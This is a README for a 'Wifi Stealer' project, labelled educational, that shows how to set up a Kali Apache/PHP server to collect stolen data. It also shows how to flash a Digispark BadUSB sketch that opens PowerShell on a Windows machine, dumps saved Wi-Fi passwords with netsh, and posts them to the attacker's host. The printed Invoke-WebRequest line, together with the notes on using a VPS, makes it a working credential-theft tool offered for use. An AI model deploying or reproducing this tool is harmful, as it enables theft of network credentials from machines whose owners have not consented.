# Wifi Stealer Dashboard

Educational/offensive‑security project that:

- Steals Wi‑Fi SSID and password from a Windows machine using PowerShell run via BadUSB (Attiny85 / Digispark).  
- Sends captured data to a PHP receiver (`wifi-recv.php`).  
- Shows a live dashboard (`index.php`) on a Kali/Apache server.

> **Warning**:  
> This is for authorized security testing and lab use only.  
> Do **not** use it on systems you do not own or have explicit permission to test.

---

## 1. Setup the PHP dashboard on Kali

Run these commands on **Kali Linux**:

```bash
# 1. Install Apache + PHP
sudo apt update
sudo apt install -y apache2 php php-cli curl

# 2. Enable Apache and start it
sudo systemctl enable apache2
sudo systemctl start apache2

# 3. Place the dashboard files in /var/www/html
sudo cp ~/wifi-stealer-dashboard/index.php /var/www/html/
sudo cp ~/wifi-stealer-dashboard/wifi-recv.php /var/www/html/

# 4. Make log file writable by Apache
sudo touch /var/www/html/wifi_creds.log
sudo chown www-data:www-data /var/www/html/{index.php,wifi-recv.php,wifi_creds.log}
sudo chmod 664 /var/www/html/wifi_creds.log
```

Open the dashboard in browser:

```text
http://192.168.1.8/
```

(Replace `192.168.1.8` with your Kali's LAN IP if different.)

---

## 2. Setup the Attiny85 / Digispark BadUSB payload

### A) Install DigiSpark support in Arduino IDE

1. Open **Arduino IDE** on Windows/macOS.  
2. Go to:  
   - `File → Preferences`  
   - In "Additional Boards Manager URLs" add:  
     ```text
     http://digistump.com/package_digistump_index.json
     ```  
3. Go to `Tools → Board → Boards Manager` and install:  
   - `Digistump AVR Boards`  
4. After install, select:  
   - `Board: Digispark (Tiny85)`  
   - `Clock: 16.5 MHz (Digispark)`  

### B) Load and flash the Attiny85 sketch

1. In Arduino IDE, open:  
   - `File → Open...`  
   - Navigate to your repo and open:  
     ```text
     ~/wifi-stealer-dashboard/payloads/wifi_stealer_digispark.ino
     ```  
2. Edit the PHP receiver URL if needed (only if you use a different IP):

   Find this line in the sketch:

   ```cpp
   DigiKeyboard.print(
     F("Invoke-WebRequest -UseBasicParsing -Uri 'http://192.168.1.8/wifi-recv.php' -Method POST -Body $b")
   );
   ```

   Change `192.168.1.8` to your Kali's LAN IP, or to your VPS IP if you use one.

3. Plug in the Attiny85 / Digispark, then upload:

   - Click the **Upload** button.  
   - When it says `Plug in device now...`, plug it in within 60 seconds.

After flashing, when you plug the Attiny85 into a Windows machine, it will:

- Open PowerShell,  
- Run `netsh wlan` to extract Wi‑Fi profiles,  
- Send captured SSID, password, IP, and OS to `wifi-recv.php`.  

---

## 3. Result

- Captured Wi‑Fi credentials are stored in:  
  ```text
  /var/www/html/wifi_creds.log
  ```  
- Open:  
  ```text
  http://192.168.1.8/
  ```  
  to view the dashboard, stats, and delete unwanted entries.

This project is designed for **local network / LAN labs**. Exposing the server to the internet requires careful handling of your public IP, port‑forwarding, or a VPS setup.
